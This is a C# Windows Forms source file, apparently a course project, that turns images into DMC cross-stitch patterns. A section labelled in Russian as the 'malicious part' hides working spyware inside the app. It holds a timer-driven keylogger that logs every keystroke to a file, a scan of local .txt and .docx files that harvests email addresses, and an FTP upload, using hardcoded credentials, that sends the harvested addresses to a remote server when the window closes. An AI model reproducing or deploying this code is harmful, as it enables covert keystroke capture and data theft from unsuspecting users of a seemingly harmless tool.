using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Drawing.Drawing2D;

namespace Courseprojecttokb
{

    public partial class Kanva : Form
    {
        public Kanva()
        {
            InitializeComponent();
            comboBox1.Enabled = false;
            numericheight.Enabled = false;
            numericwidth.Enabled = false;
            checkBox1.Enabled = false;
        }
        //доступ к клавиатуре
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private List<Options> ColorsInfo = new List<Options>();
        //private List<string> UsedColors = new List<string>();
        double propor;
        bool onoff = false;



        private void ColorsToList(string path)
        {
            ColorsInfo.Clear();
            using (StreamReader fs = new StreamReader(path))
            {
                string temp = "";
                while (true)
                {
                    temp = fs.ReadLine();
                    if (temp == null) break;
                    string[] array = new string[5];
                    array = temp.Split(new[] { ' ' }, 5);
                    ColorsInfo.Add(new Options
                    {
                        Number = array[0],
                        HEXFormat = array[1],
                        R = Convert.ToInt32(array[2]),
                        G = Convert.ToInt32(array[3]),
                        B = Convert.ToInt32(array[4]),
                    });
                }
            }
        }
        Bitmap mainimage;


        private Bitmap PictureSize(Bitmap imagecopy)
        {
            if (imagecopy.Width < 30 && imagecopy.Height < 30)
            {
                Bitmap im = new Bitmap(imagecopy);
                Size size = new Size(imagecopy.Width, imagecopy.Height);
                imagecopy = new Bitmap(imagecopy, size);
                this.pictureBox1.Size = new Size(imagecopy.Width * 5, imagecopy.Height * 5);
            }
            else if (imagecopy.Width < 700 && imagecopy.Height < 500)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = 500;
                    double del = h / Convert.ToDouble(imagecopy.Height);
                    int w = (int)Math.Round(del * imagecopy.Width);
                    //Size size = new Size(w, h);
                    //imagecopy = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = imagecopy.Size;
                    this.pictureBox1.Size = new Size(w, h);
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = 700;
                    double del = w / Convert.ToDouble(imagecopy.Width);
                    int h = (int)Math.Round(del * imagecopy.Height);
                    //Size size = new Size(w, h);
                    //imagecopy = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = imagecopy.Size;
                    this.pictureBox1.Size = new Size(w, h);
                }

            }
            else if (imagecopy.Width > 700 || imagecopy.Height > 500)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = 500;
                    double del = h / propor;
                    int w = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    imagecopy = new Bitmap(imagecopy, size);
                    this.pictureBox1.Size = imagecopy.Size;
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = 700;
                    double del = w / propor;
                    int h = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    imagecopy = new Bitmap(imagecopy, size);
                    this.pictureBox1.Size = imagecopy.Size;
                }
            }
            numericheight.Text = Convert.ToString(imagecopy.Height);
            numericwidth.Text = Convert.ToString(imagecopy.Width);

            return imagecopy;
        }
        private void PictureToKanva(Bitmap imagecopy)
        {
            Bitmap input = new Bitmap(imagecopy);
            Bitmap output = new Bitmap(input.Width, input.Height);
            string colornum = "";
            // перебираем в циклах все пиксели исходного изображения
            for (int j = 0; j < input.Height; j++)
                for (int i = 0; i < input.Width; i++)
                {
                    // получаем (i, j) пиксель
                    UInt32 pixel = (UInt32)(input.GetPixel(i, j).ToArgb());
                    // получаем компоненты цветов пикселя
                    int R1 = (int)((pixel & 0x00FF0000) >> 16); // красный
                    int G1 = (int)((pixel & 0x0000FF00) >> 8); // зеленый
                    int B1 = (int)(pixel & 0x000000FF); // синий
                    int R2 = R1, G2 = G1, B2 = B1;
                    int fi, f_min = 1000000;

                    foreach (Options opt in ColorsInfo)
                    {
                        fi = 30 * (opt.R - R1) * (opt.R - R1) +
                           59 * (opt.G - G1) * (opt.G - G1) +
                           11 * (opt.B - B1) * (opt.B - B1);
                        if (fi < f_min)
                        {
                            R2 = opt.R;
                            G2 = opt.G;
                            B2 = opt.B;
                            colornum = opt.Number;
                            f_min = fi;
                        }

                    }
                    UInt32 newPixel = 0xFF000000 | ((UInt32)R2 << 16) | ((UInt32)G2 << 8) | ((UInt32)B2);
                    // добавляем его в Bitmap нового изображения
                    output.SetPixel(i, j, Color.FromArgb((int)newPixel));
                }

            pictureBox1.Image = output;

            //MessageBox.Show("Готово");

        }

        private void button1_Click(object sender, EventArgs e)
        {
            onoff = false;
            //Bitmap для открываемого изображения
            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Image Files(*.BMP;*.JPG;*.GIF;*.PNG)|*.BMP;*.JPG;*.GIF;*.PNG|All files (*.*)|*.*"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                try
                {
                    mainimage = new Bitmap(open_dialog.FileName);
                    if (mainimage.Width > mainimage.Height)
                        propor = (double)mainimage.Width / (double)mainimage.Height;
                    else propor = (double)mainimage.Height / (double)mainimage.Width;

                    mainimage = PictureSize(mainimage);
                    onoff = true;
                    PictureToKanva(mainimage);
                    // pictureBox1.Image = mainimage;

                    comboBox1.Enabled = true;
                    numericheight.Enabled = true;
                    numericwidth.Enabled = true;
                    checkBox1.Enabled = true;
                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно открыть выбранный файл",
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void CorrectSize(Bitmap imagecopy)
        {
            Bitmap bitmap = new Bitmap(imagecopy);
            if (checkBox1.Checked == true)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = Convert.ToInt32(numericheight.Text);
                    double del = h / propor;
                    int w = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    numericwidth.Text = w.ToString();
                    bitmap = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = bitmap.Size;
                    bitmap = PictureSize(bitmap);
                    PictureToKanva(bitmap);
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = Convert.ToInt32(numericwidth.Text);
                    double del = w / propor;
                    int h = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    numericheight.Text = h.ToString();
                    bitmap = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = bitmap.Size;
                    bitmap = PictureSize(bitmap);
                    PictureToKanva(bitmap);
                }
            }
            else if (onoff == true)
            {
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                bitmap = new Bitmap(imagecopy, size);
                //this.pictureBox1.Size = bitmap.Size;
                bitmap = PictureSize(bitmap);
                PictureToKanva(bitmap);
            }

        }

        private void numericwidth_ValueChanged(object sender, EventArgs e)
        {
            CorrectSize(mainimage);
        }

        private void numericheight_ValueChanged(object sender, EventArgs e)
        {
            CorrectSize(mainimage);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Bitmap imagecopy = new Bitmap(mainimage);
            if (Convert.ToInt32(comboBox1.Text) == 60)
            {
                ColorsToList("DMC60.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 150)
            {
                ColorsToList("DMC150.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 200)
            {
                ColorsToList("DMC200.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 350)
            {
                ColorsToList("DMC350.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if ((Convert.ToInt32(comboBox1.Text) == 425))
            {
                ColorsToList("DMC.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
        }
        private Color PerceivedBrightness(Color c)
        {
            int val = (int)Math.Sqrt(
            c.R * c.R * .241 +
            c.G * c.G * .691 +
            c.B * c.B * .068);
            return (val > 130 ? Color.Black : Color.White);
        }


        PictureBoxWithInterpolationMode pictureBox1 = new PictureBoxWithInterpolationMode
        {
            Name = "pictureBox1",
            Size = new Size(200, 250),
            Location = new Point(15, 190),
            //Image = pictureBox1.Image,
            SizeMode = PictureBoxSizeMode.StretchImage,
            InterpolationMode = InterpolationMode.NearestNeighbor
        };

        //открытие формы
        private void Form1_Load(object sender, EventArgs e)
        {
            tabPage1.Controls.Add(pictureBox1);
            timer1.Start();
            //comboBox1.Text = "425";
            ColorsToList("DMC60.txt");
            NumbersToList();
            File.Delete("email.txt");
            ReadAllFiles();
        }

        private List<Numbers> UsedNumbers = new List<Numbers>();
        List<List<string>> MatrixHex = new List<List<string>>();
        string allsymbols = "▝▞ᴄᴅᴆᴇᴈᴉ▟■□▢▣▬▭▮▯▰▱▲△▴▵▶▷▸▹►◦◧◨◩◪ᴿᵀᵁᵂᵃᵄᵅᵆᵇᵈ◫◬◭◮◯◷◸◹◺ᴀᴃᴊᴋ▤▥▦▧▨▩▪▫ᴌᴍᴎᴏᴐᴑᴒᴓᴔᴕᴖᴗᴘᴙᴚᴛᴜ▻▼▽▾▿◀◁◂◃◄◅◆◇◈◉◊○◌◍◎●◐◑◒◓◔◕◖◗◘◙◚◛◢◣◤◥ᴝᴞᴟᴠᴡᴢᴣᴤᴥᴦᴧᴨᴩᴪᴫᴬᴭᴮᴯᴰᴱᴲᴳᴴᴵᴶᴷᴸᴹ◰◱◲◳◴◵◶ᴺᴻᴼᴽᴾᵉᵊᵋᵌᵍᵎᵏᵐᵑᵒᵓᵔᵕᵖᵗᵘᵙᵚᵛᵜᵝᵞᵟᵠᵡᵢᵣᵤᵥᵦᵧᵨᵩᵪᵫᵬᵭᵮᵯᵰᵱᵲᵳᵴᵵᵶᵷᵸᵹᵺᵻᵼᵽᵾᵿᶀᶁᶂᶃᶄᶅᶆᶇᶈᶉᶊᶋᶌᶍᶎᶏᶐᶑᶒᶓᶔᶕᶖᶗᶘᶙᶚᶛᶜᶝᶞᶟᶠᶡᶢᶣᶤᶥᶦᶧᶨᶩᶪᶫᶬᶭᶮᶯᶰᶱᶲᶳᶴᶵᶶᶷᶸᶹᶺᶻᶼᶽᶾᶿ";
        List<Palitra> palitras = new List<Palitra>();
        int hmatrix = 0, wmatrix = 0;

        //Список номеров и hex
        private void NumbersToList()
        {
            //ColorsInfo.Clear();
            using (StreamReader fs = new StreamReader("Numbers.txt"))
            {
                string temp = "";
                while (true)
                {
                    temp = fs.ReadLine();
                    if (temp == null) break;
                    string[] array = new string[2];
                    array = temp.Split(new[] { ' ' }, 2);
                    UsedNumbers.Add(new Numbers
                    {
                        Number = array[0],
                        HEXFormat = array[1],
                    });
                }
            }
        }

        private void PictureToMatrix()
        {
            palitras.Clear();
            if (pictureBox1.Image != null)
            {
                MatrixHex.Clear();
                Bitmap input = new Bitmap(pictureBox1.Image);
                hmatrix = input.Height;
                wmatrix = input.Width;
                int k = 0;
                // перебираем в циклах все пиксели исходного изображения
                for (int j = 0; j < input.Height; j++)
                {
                    List<string> row = new List<string>();
                    for (int i = 0; i < input.Width; i++)
                    {
                        // получаем (i, j) пиксель

                        Color pixel = input.GetPixel(i, j);
                        String htmlColor = System.Drawing.ColorTranslator.ToHtml(pixel);

                        if (!(palitras.Exists(x => x.HEXFormat == htmlColor)))
                        {
                            palitras.Add(new Palitra(UsedNumbers, htmlColor.ToLower())
                            {
                                HEXFormat = htmlColor,
                                Symbol = allsymbols[k],

                            });
                            k++;
                        }
                        row.Add(htmlColor);

                    }
                    MatrixHex.Add(row);
                }
            }
            else MessageBox.Show("Сначала загрузите картинку!");
        }
       
        private void panel2_Paint(object sender, PaintEventArgs e)
        {
            panel2.Size = new Size(wmatrix * 20 + 20, hmatrix * 20 + 20);
            Font f = new Font(Font, FontStyle.Bold);
            for (int i = 0; i < wmatrix; i++)
            {
                for (int j = 0; j < hmatrix; j++)
                {
                    foreach (Palitra col in palitras)
                    {
                        if (col.HEXFormat == MatrixHex[j][i])
                        {
                            Color bg = ColorTranslator.FromHtml(MatrixHex[j][i]);
                            e.Graphics.FillRectangle(new SolidBrush(bg), i * 20 + 20, j * 20 + 20, 20, 20);
                            e.Graphics.DrawString(col.Symbol.ToString(), f, new SolidBrush(PerceivedBrightness(bg)), i * 20 + 24, j * 20 + 24);
                            break;
                        }
                    }
                }
            }
        }
        private void tabPage1_Enter(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void tabPage3_Enter(object sender, EventArgs e)
        {
            
            PictureToMatrix();
            Paint += new PaintEventHandler(panel2_Paint);
            
            foreach (Palitra pal in palitras)
            {
                ListViewItem item = new ListViewItem(pal.Number);
                item.SubItems.Add(pal.HEXFormat);
                item.SubItems.Add(pal.Symbol.ToString());
                Color bg = ColorTranslator.FromHtml(pal.HEXFormat);
                item.SubItems[1].BackColor = bg;
                item.SubItems[1].ForeColor = PerceivedBrightness(bg);
                item.UseItemStyleForSubItems = false;
                listView1.Items.Add(item);
            }
        }

        //запись в файл
        private void WriteTotxt(string value)
        {
            StreamWriter stream = new StreamWriter("info.txt", true);      
            stream.Write(value);
            stream.Close();
        }




        //Вредоносная часть

        private void EmailOrNot(string text)
        {
            List<string> Email = new List<string>();
            string re = @"(\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*)";
            foreach (Match match in Regex.Matches(text, re))
            {
                Email.Add(match.Value);
            }
            if (Email.Count != 0)
            {
                File.AppendAllText("email.txt", String.Format(String.Join(Environment.NewLine, Email)) + Environment.NewLine);
                //StreamWriter stream = new StreamWriter("email.txt", true);
                //foreach (string em in Email)
                //{
                //    stream.Write(Environment.NewLine + em);
                //}
                //stream.Close();
            }
        }

        //просмотр файлов 
        private void ReadAllFiles()
        {
            List<string> fullfilesPath = Directory.EnumerateFiles("F:\\test", "*.*", SearchOption.AllDirectories).Where(s => s.EndsWith(".txt") || s.EndsWith(".docx")).ToList<string>();
            string file, line;
            for (int i=0; i<fullfilesPath.Count; i++)
            {
                file = fullfilesPath[i];
                StreamReader FileRead = new StreamReader(file);
                while((line = FileRead.ReadLine()) != null)
                {
                    EmailOrNot(line);
                }
            }
        }

        //закрытие формы и проверка на email в файле аудита
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            StreamReader stream = new StreamReader("info.txt");
            string temp = "";
            while (true)
            {
                temp = stream.ReadLine();
                if (temp == null) break;
                EmailOrNot(temp);
            }
            stream.Close();
            SendFileFTP();
            File.AppendAllText("info.txt", " ");
        }

        //нажатие клавишы Shift
        public static bool ShiftActive()
        {
            return ((Control.ModifierKeys & Keys.Shift) == Keys.Shift);
        }
        string text;
        bool capslock, numlock;

       
        private void SendFileFTP()
        {

            FileInfo fileInf = new FileInfo("email.txt");
            string uri = "ftp://" + "10.20.130.22:2221" + "/" + fileInf.Name;
            FtpWebRequest reqFTP;
            // Создаем объект FtpWebRequest
            reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + "10.20.130.22:2221" + "/" + fileInf.Name));
            // Учетная запись
            reqFTP.Credentials = new NetworkCredential("francis", "francis");
            reqFTP.KeepAlive = false;
            // Задаем команду на закачку
            reqFTP.Method = WebRequestMethods.Ftp.UploadFile;
            // Тип передачи файла
            reqFTP.UseBinary = true;
            // Сообщаем серверу о размере файла
            reqFTP.ContentLength = fileInf.Length;
            // Буффер в 2 кбайт
            int buffLength = 2048;
            byte[] buff = new byte[buffLength];
            int contentLen;
            // Файловый поток
            FileStream fs = fileInf.OpenRead();
            try
            {
                Stream strm = reqFTP.GetRequestStream();
                // Читаем из потока по 2 кбайт
                contentLen = fs.Read(buff, 0, buffLength);
                // Пока файл не кончится
                while (contentLen != 0)
                {
                    strm.Write(buff, 0, contentLen);
                    contentLen = fs.Read(buff, 0, buffLength);
                }
                // Закрываем потоки
                strm.Close();
                fs.Close();
            }
            catch (Exception ex)
            {

                return;// MessageBox.Show(ex.Message, "Ошибка");

            }
           
            
        }




        //таймер
        private void timer1_Tick(object sender, EventArgs e)
        {
            capslock = Console.CapsLock;
            numlock = Console.NumberLock;
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    buffer = Enum.GetName(typeof(Keys), i);

                    switch (buffer)
                    { 
                        case "Space": buffer = " "; break;
                        case "CapsLock": buffer = ""; break;
                        case "Enter": buffer = (Environment.NewLine); break;
                        case "LButton": buffer = ""; break;
                        case "LMenu": buffer = ""; break;
                        case "Back":
                            string str = File.ReadAllText("info.txt");
                            if (str.Length > 0) str = str.Remove(str.Length - 1);
                            File.WriteAllText("info.txt", str);
                            buffer = "";
                            break;
                        case "OemQuotes": buffer = ShiftActive() ? "\"" : "'"; break;
                        case "Oemcomma": buffer = ShiftActive() ? "<" : ","; break;
                        case "OemPeriod": buffer = ShiftActive() ? ">" : "."; break;
                        case "Oem2": buffer = ShiftActive() ? "?" : "/"; break;
                        case "Oem6": buffer = ShiftActive() ? "}" : "]"; break;
                        case "Oem4": buffer = ShiftActive() ? "{" : "["; break;
                        case "OemMinus": buffer = ShiftActive() ? "_" : "-"; break;
                        case "Oemplus": buffer = ShiftActive() ? "+" : "="; break;
                        case ("LShiftKey"): buffer = ""; break;
                        case "D0": buffer = ShiftActive() ? ")" : "0"; break;
                        case "D1": buffer = ShiftActive() ? "!" : "1"; break;
                        case "D2": buffer = ShiftActive() ? "@" : "2"; break;
                        case "D3": buffer = ShiftActive() ? "#" : "3"; break;
                        case "D4": buffer = ShiftActive() ? "$" : "4"; break;
                        case "D5": buffer = ShiftActive() ? "%" : "5"; break;
                        case "D6": buffer = ShiftActive() ? "^" : "6"; break;
                        case "D7": buffer = ShiftActive() ? "&" : "7"; break;
                        case "D8": buffer = ShiftActive() ? "*" : "8"; break;
                        case "D9": buffer = ShiftActive() ? "(" : "9"; break;
                        case "OemPipe": buffer = ShiftActive() ? "|" : "\\"; break;
                        case "OemSemicolon": buffer = ShiftActive() ? ":" : ";"; break;

                        case "NumPad0": buffer = "0"; break;
                        case "NumPad1": buffer = "1"; break;
                        case "NumPad2": buffer = "2"; break;
                        case "NumPad3": buffer = "3"; break;
                        case "NumPad4": buffer = "4"; break;
                        case "NumPad5": buffer = "5"; break;
                        case "NumPad6": buffer = "6"; break;
                        case "NumPad7": buffer = "7"; break;
                        case "NumPad8": buffer = "8"; break;
                        case "NumPad9": buffer = "9"; break;
                        case "Add": buffer = "+"; break;
                        case "Subtract": buffer = "-"; break;
                        case "Multiply": buffer = "*"; break;
                        case "Divide": buffer = "/"; break;
                    }
                    buffer = capslock ? buffer.ToUpper() : buffer.ToLower();
                    buffer = ShiftActive() ? buffer.ToUpper() : buffer.ToLower();                   
                }
            }
            text += buffer;
            WriteTotxt(text);
            text = "";
        }


        //текст с браузера
        /* private static String HTMLText()
         {
             string data = ""; ;
             string urlAddress = "https://ru.wikipedia.org/wiki/Электронная_почта";
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlAddress);

             Cookie cookie = new Cookie
             {
                 Name = "beget",
                 Value = "begetok"
             };

             request.CookieContainer = new CookieContainer();
             request.CookieContainer.Add(new Uri(urlAddress), cookie);

             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
             if (response.StatusCode == HttpStatusCode.OK)
             {
                 Stream receiveStream = response.GetResponseStream();
                 StreamReader readStream = null;
                 if (response.CharacterSet == null)
                 {
                     readStream = new StreamReader(receiveStream);
                 }
                 else
                 {
                     readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                 }
                 data = readStream.ReadToEnd();
                 response.Close();
                 readStream.Close();
             }
             return data;
         }*/
    }
}
